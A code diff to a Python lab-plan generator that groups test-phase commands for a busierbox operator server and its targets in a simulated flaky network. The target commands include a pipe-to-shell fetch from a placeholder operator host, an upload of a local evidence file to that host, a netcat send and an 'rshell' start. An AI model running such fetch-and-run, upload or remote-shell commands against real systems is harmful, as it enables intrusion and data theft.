@@ -559,22 +559,113 @@ for key, rec in path_requirements.items():
     elif not rec["exists"]:
         missing_requirements.append(f"missing {key} at {rec['path']}")
 
-operator_commands = [
-    "scripts/busierbox-server --daemon --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
-    "scripts/busierbox-server --systemd-user-unit --systemd-dry-run --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
-    "scripts/busierbox-server --target-id target-alpha --queue-command 'busierbox survey --json'",
-    "scripts/busierbox-server --target-id target-bravo --queue-command 'busierbox survey --json'",
-    "scripts/busierbox-server --json-status > offline-status.json",
-    "scripts/busierbox-server --line-tui",
-    "scripts/busierbox-server --json-status > final-status.json",
-]
+phase_operator_commands = {
+    "offline-queue": [
+        "scripts/busierbox-server --daemon --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
+        "scripts/busierbox-server --target-id target-alpha --queue-command 'busierbox survey --json'",
+        "scripts/busierbox-server --target-id target-bravo --queue-command 'busierbox survey --json'",
+        "scripts/busierbox-server --line-tui",
+        "scripts/busierbox-server --json-status > offline-status.json",
+    ],
+    "offline-workflow-drain": [
+        "scripts/busierbox-server --target-id target-workflow --run-target-workflow-action queue-survey-bootstrap",
+        "scripts/busierbox-server --target-id target-workflow --run-target-workflow-action stage-file-fetch --target-workflow-local-file ./payload.bin --target-workflow-request-name payload.bin",
+        "scripts/busierbox-server --target-id target-workflow --json-status > offline-workflow-drain-status.json",
+        "scripts/busierbox-server --line-tui --target-id target-workflow",
+    ],
+    "systemd-user-service": [
+        "scripts/busierbox-server --systemd-user-action print --systemd-user-dry-run --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
+        "scripts/busierbox-server --systemd-user-action status --systemd-user-dry-run",
+    ],
+    "short-phone-home-window": [
+        "./host-network-setup.sh link target-alpha-link-up",
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-alpha-poll.json",
+    ],
+    "duplicate-poll": [
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-duplicate-alpha-poll.json",
+    ],
+    "dropped-result-upload": [
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-dropped-alpha-result.json",
+    ],
+    "malformed-result-upload": [
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-malformed-alpha-result.json",
+    ],
+    "result-upload": [
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-alpha-result.json",
+    ],
+    "multi-target-isolation": [
+        "scripts/busierbox-server --target-id target-alpha --json-status > multi-target-isolation.json",
+        "scripts/busierbox-server --target-id target-bravo --list-command-queue",
+    ],
+    "target-mismatch-phone-home": [
+        "scripts/busierbox-server --target-id target-alpha --json-status > target-mismatch-phone-home.json",
+    ],
+    "survey-window": [
+        "scripts/busierbox-server --survey-bootstrap --survey-bootstrap-port 22207 --one-shot",
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-survey-result.json",
+    ],
+    "partial-transfer": [
+        "scripts/busierbox-server --file-service --file-service-port 22204 --one-shot",
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-partial-upload.json",
+    ],
+    "bridge-interruption": [
+        "scripts/busierbox-server --save-bridge-profile flaky-bad-bridge --bridge-port 22206 --bridge-dest-host target-alpha --bridge-dest-port 80 --bridge-hop operator:22206=target-alpha:80",
+        "scripts/busierbox-server --bridge-profile flaky-bad-bridge --bridge",
+        "scripts/busierbox-server --target-id target-alpha --json-status > after-bridge-relay.json",
+    ],
+    "return-offline": [
+        "scripts/busierbox-server --json-status > return-offline-status.json",
+        "scripts/busierbox-server --json-status > final-status.json",
+    ],
+}
 
-target_commands = [
-    "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue daemon --live",
-    "simulate dropped /command-queue/result upload by closing target link before Content-Length bytes are sent",
-    "wget -O- http://<operator-ip>:22207/survey.sh | /bin/sh",
-    "busierbox upload /tmp/evidence.txt --operator http://<operator-ip>:22204",
-]
+phase_target_commands = {
+    "offline-workflow-drain": [
+        "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue once --target-id target-workflow",
+        "busierbox fetch payload.bin --host <operator-ip> --port 22204 --target-id target-workflow",
+    ],
+    "short-phone-home-window": [
+        "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue once --target-id target-alpha",
+    ],
+    "duplicate-poll": [
+        "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue once --target-id target-alpha",
+    ],
+    "dropped-result-upload": [
+        "simulate dropped /command-queue/result upload by closing target link before Content-Length bytes are sent",
+    ],
+    "malformed-result-upload": [
+        "printf '{bad-json' | nc <operator-ip> 22205",
+    ],
+    "result-upload": [
+        "busierbox command-queue result --target-id target-alpha --result-json command-result.json",
+    ],
+    "target-mismatch-phone-home": [
+        "busierbox command-queue result --target-id target-bravo --result-json command-result.json",
+    ],
+    "survey-window": [
+        "wget -O- http://<operator-ip>:22207/survey.sh | /bin/sh",
+    ],
+    "partial-transfer": [
+        "busierbox upload /tmp/evidence.txt --operator http://<operator-ip>:22204",
+    ],
+    "bridge-interruption": [
+        "busierbox rshell start --target-id target-alpha",
+    ],
+}
+
+for phase in phases:
+    phase["operator_commands"] = phase_operator_commands.get(phase["name"], [])
+    phase["target_commands"] = phase_target_commands.get(phase["name"], [])
+
+operator_commands = []
+target_commands = []
+for phase in phases:
+    for command in phase["operator_commands"]:
+        if command not in operator_commands:
+            operator_commands.append(command)
+    for command in phase["target_commands"]:
+        if command not in target_commands:
+            target_commands.append(command)
 
 plan = {
     "schema": 1,
@@ -701,6 +792,28 @@ for target, command in sorted(qemu_command_templates.items()):
     qemu_command_script.append(f"# {target}")
     qemu_command_script.append(shlex.join(str(item) for item in command))
     qemu_command_script.append("")
+
+operator_command_script = [
+    "#!/bin/sh",
+    "set -eu",
+    "",
+    "# Phase-grouped operator commands for the planned flaky-network lab.",
+]
+target_command_script = [
+    "#!/bin/sh",
+    "set -eu",
+    "",
+    "# Phase-grouped target commands for the planned flaky-network lab.",
+]
+for phase in phases:
+    if phase["operator_commands"]:
+        operator_command_script.append(f"# phase: {phase['name']}")
+        operator_command_script.extend(phase["operator_commands"])
+        operator_command_script.append("")
+    if phase["target_commands"]:
+        target_command_script.append(f"# phase: {phase['name']}")
+        target_command_script.extend(phase["target_commands"])
+        target_command_script.append("")
 
 phase_validator_script = r'''#!/usr/bin/env python3
 import argparse
@@ -877,8 +990,8 @@ def file_sha256(path):
 
 (run_dir / "topology.json").write_text(json.dumps(topology, indent=2, sort_keys=True) + "\n", encoding="utf-8")
 (run_dir / "plan.json").write_text(json.dumps(plan, indent=2, sort_keys=True) + "\n", encoding="utf-8")
-(run_dir / "operator-commands.sh").write_text("#!/bin/sh\nset -eu\n\n" + "\n".join(operator_commands) + "\n", encoding="utf-8")
-(run_dir / "target-commands.sh").write_text("#!/bin/sh\nset -eu\n\n" + "\n".join(target_commands) + "\n", encoding="utf-8")
+(run_dir / "operator-commands.sh").write_text("\n".join(operator_command_script) + "\n", encoding="utf-8")
+(run_dir / "target-commands.sh").write_text("\n".join(target_command_script) + "\n", encoding="utf-8")
 (run_dir / "host-network-setup.sh").write_text("\n".join(host_network_script), encoding="utf-8")
 (run_dir / "qemu-commands.sh").write_text("\n".join(qemu_command_script), encoding="utf-8")
 (run_dir / "validate-phase-artifacts.py").write_text(phase_validator_script, encoding="utf-8")
